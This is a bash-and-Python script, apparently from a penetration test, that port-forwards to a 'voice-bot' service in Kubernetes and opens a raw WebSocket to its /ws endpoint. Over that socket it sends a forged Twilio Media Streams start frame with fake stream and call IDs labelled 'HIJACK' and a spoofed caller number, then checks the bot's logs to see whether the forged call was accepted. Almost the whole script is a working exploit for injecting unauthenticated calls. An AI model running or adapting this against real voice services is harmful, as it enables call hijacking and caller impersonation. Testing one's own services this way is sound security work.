#!/usr/bin/env bash
# v1.sh — V1 final attempt: correctly-shaped Twilio start frame (streamSid inside start{}).
set -uo pipefail
OUT=/tmp/px-v1; mkdir -p "$OUT"
kubectl port-forward -n voice svc/voice-bot 28501:8080 >/tmp/pf-v1.log 2>&1 &
PF=$!; trap 'kill $PF 2>/dev/null' EXIT
sleep 4
grep -q "Forwarding from" /tmp/pf-v1.log || { echo "BIND FAILED"; cat /tmp/pf-v1.log; exit 1; }
curl -sf --max-time 6 http://127.0.0.1:28501/healthz >/dev/null || { echo "SANITY FAILED"; exit 1; }
echo "[path verified]"
python3 - <<'PY' | tee "$OUT/v1.txt"
import socket, base64, os, json, time, struct
s = socket.create_connection(("127.0.0.1", 28501), timeout=10)
key = base64.b64encode(os.urandom(16)).decode()
s.sendall((f"GET /ws HTTP/1.1\r\nHost: 127.0.0.1:28501\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
           f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n").encode())
time.sleep(1); s.settimeout(5)
resp = s.recv(4096); status = resp.split(b"\r\n")[0].decode(errors="replace")
print("handshake:", status)
if "101" in status:
    def send_text(txt):
        b = txt.encode(); mask = os.urandom(4); n = len(b)
        hdr = b"\x81" + (bytes([0x80 | n]) if n < 126 else bytes([0x80 | 126]) + struct.pack(">H", n))
        s.sendall(hdr + mask + bytes(x ^ mask[i % 4] for i, x in enumerate(b)))
    send_text(json.dumps({"event":"connected","protocol":"Call","version":"1.0.0"}))
    send_text(json.dumps({"event":"start","sequenceNumber":"1","streamSid":"MZ_FORGED_V1b",
        "start":{"streamSid":"MZ_FORGED_V1b","callSid":"CA_FORGED_V1_HIJACK",
                 "customParameters":{"caller":"+15556666"},
                 "mediaFormat":{"encoding":"audio/x-mulaw","sampleRate":8000,"channels":1}}}))
    print("correctly-shaped forged start sent at", time.strftime("%H:%M:%S"))
    time.sleep(10)
s.close()
PY
echo "-- bot logs in the window (pipeline boot = LANDED):"
kubectl logs -n voice deploy/voice-bot --since=3m 2>/dev/null | grep -viE "healthz" | tail -15 | tee -a "$OUT/v1-logs.txt"
kill $PF 2>/dev/null; echo done
